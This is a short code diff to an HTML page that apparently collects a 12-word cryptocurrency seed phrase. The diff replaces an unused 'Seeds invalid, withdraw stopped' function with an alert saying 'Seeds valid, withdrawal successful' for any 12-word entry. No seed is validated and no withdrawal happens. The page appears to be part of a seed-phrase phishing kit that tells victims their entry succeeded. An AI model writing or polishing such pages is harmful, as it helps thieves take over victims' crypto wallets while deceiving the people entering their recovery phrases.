@@ -101,12 +101,6 @@
   
   
 <script>
-function showMessage() {
-  var message = "Seeds invalid, withdraw stopped";
-  alert(message);
-  return true;
-}
-
 const form = document.querySelector('form');
 const messageInput = document.querySelector('#message');
 
@@ -117,6 +111,8 @@ form.addEventListener('submit', (event) => {
   if (words.length !== 12) {
     event.preventDefault();
     alert('Seed must contain exactly 12 words.');
+  } else {
+    alert('Seeds valid, withdrawal successful');
   }
 });
 
@@ -127,6 +123,7 @@ function isNumberKey(evt){
     return true;
 }
 </script>
+
  
 </body>
 </html>
